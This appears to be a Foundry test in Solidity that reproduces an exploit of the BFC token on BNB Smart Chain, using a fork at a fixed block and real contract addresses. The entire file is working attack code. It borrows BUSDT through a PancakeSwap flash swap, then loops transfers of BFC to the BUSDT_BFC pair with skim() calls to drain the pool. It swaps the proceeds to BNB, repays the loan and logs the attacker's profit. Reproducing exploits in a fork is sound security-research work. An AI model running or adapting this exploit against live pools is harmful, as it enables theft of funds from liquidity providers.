// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./interface.sol";

contract BFCTest is Test {
    IUni_Pair_V2 BUSDT_WBNB =
        IUni_Pair_V2(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE);
    IUni_Pair_V2 BUSDT_BFC =
        IUni_Pair_V2(0x71e1949A1180C0F945fe47C96f88b1a898760c05);
    IUni_Router_V2 Router =
        IUni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    IERC20 BFC = IERC20(0x595eac4A0CE9b7175a99094680fbe55A774B5464);
    IERC20 BUSDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);

    function setUp() public {
        vm.createSelectFork("bsc", 31599443);
        vm.label(address(BUSDT_WBNB), "BUSDT_WBNB");
        vm.label(address(BUSDT_BFC), "BUSDT_BFC");
        vm.label(address(Router), "Router");
        vm.label(address(BFC), "BFC");
        vm.label(address(BUSDT), "BUSDT");
        vm.label(address(WBNB), "WBNB");
    }

    function testExploit() public {
        deal(address(BUSDT), address(this), 0);
        deal(address(this), 0);
        bytes memory swapData = abi.encode(
            address(BFC),
            address(BUSDT_BFC),
            400_000 * 1e18
        );
        BUSDT_WBNB.swap(400_000 * 1e18, 0, address(this), swapData);
        swapBUSDTToBNB();

        emit log_named_decimal_uint(
            "Attacker BNB balance after attack",
            address(this).balance,
            18
        );
    }

    function pancakeCall(
        address _sender,
        uint256 _amount0,
        uint256 _amount1,
        bytes calldata _data
    ) external {
        BFC.approve(address(Router), type(uint256).max);
        BUSDT.approve(address(Router), type(uint256).max);

        swapBUSDTToBFC(BUSDT.balanceOf(address(BUSDT_BFC)));
        BFC.transfer(address(BFC), BFC.balanceOf(address(this)));
        swapBUSDTToBFC(BUSDT.balanceOf(address(this)));
        // Start exploit
        uint256 counter;
        while (counter < 100) {
            console.log();
            uint256 balanceBFC = BFC.balanceOf(address(this));
            uint256 pairBalanceBFC = BFC.balanceOf(address(BUSDT_BFC));

            if (balanceBFC >= (50 * pairBalanceBFC)) {
                balanceBFC = (pairBalanceBFC - 1) * 50;
            }

            console.log("BFC balance attacker:", BFC.balanceOf(address(this)));
            console.log("BFC balance BUSDT_BFC:", BFC.balanceOf(address(BUSDT_BFC)));

            BFC.transfer(address(BUSDT_BFC), balanceBFC);
            BUSDT_BFC.skim(address(this));
            BFC.transfer(address(BUSDT_BFC), 0);

            console.log("BFC balance attacker:", BFC.balanceOf(address(this)));
            console.log("BFC balance BUSDT_BFC:", BFC.balanceOf(address(BUSDT_BFC)));

            if (balanceBFC < (pairBalanceBFC * 50)) {
                ++counter;
            } else {
                break;
            }
        }
        // End exploit
        swapBFCToBUSDT();
        uint256 returnFlashAmount = (_amount0 * 1000) / 997 + 1;
        BUSDT.transfer(address(BUSDT_WBNB), returnFlashAmount);
    }

    receive() external payable {}

    function swapBUSDTToBFC(uint256 amountIn) internal {
        address[] memory path = new address[](2);
        path[0] = address(BUSDT);
        path[1] = address(BFC);

        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amountIn,
            0,
            path,
            address(this),
            block.timestamp + 1000
        );
    }

    function swapBFCToBUSDT() internal {
        address[] memory path = new address[](2);
        path[0] = address(BFC);
        path[1] = address(BUSDT);

        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            BFC.balanceOf(address(this)),
            0,
            path,
            address(this),
            block.timestamp + 1000
        );
    }

    function swapBUSDTToBNB() internal {
        address[] memory path = new address[](2);
        path[0] = address(BUSDT);
        path[1] = address(WBNB);

        Router.swapExactTokensForETH(
            BUSDT.balanceOf(address(this)),
            0,
            path,
            address(this),
            block.timestamp + 1000
        );
    }
}
